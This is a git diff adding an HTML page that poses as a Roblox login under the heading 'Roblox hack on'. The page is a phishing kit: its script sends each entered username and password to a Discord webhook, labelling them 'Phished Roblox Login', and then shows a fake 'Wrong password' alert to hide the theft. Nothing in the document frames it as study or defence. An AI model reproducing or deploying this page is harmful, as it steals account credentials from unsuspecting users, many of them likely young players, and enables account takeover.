@@ -1,1 +1,36 @@
-# rblx-hack
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Login</title>
+</head>
+<body>
+  <h2>Roblox hack on</h2>
+
+  <form id="phishForm">
+    <input type="text" id="user" placeholder="Username" required><br>
+    <input type="password" id="pass" placeholder="Password" required><br>
+    <input type="submit" value="Log In">
+  </form>
+
+  <script>
+    document.getElementById('phishForm').onsubmit = function(e) {
+      e.preventDefault();
+
+      const webhookURL = "[https://discord.com/api/webhooks/1375407829879488552/gBnV23D9Y78yeAjBRCNfju2m_XLltImQlzbG2nKxZdAgA1u8MfmqZhPgRHQrM3Mu_7Lv]";
+
+      const username = document.getElementById('user').value;
+      const password = document.getElementById('pass').value;
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: "**Phished Roblox Login**\nUsername: " + username + "\nPassword: " + password
+        })
+      });
+
+      alert("Wrong password. Try again.");
+    };
+  </script>
+</body>
+</html>
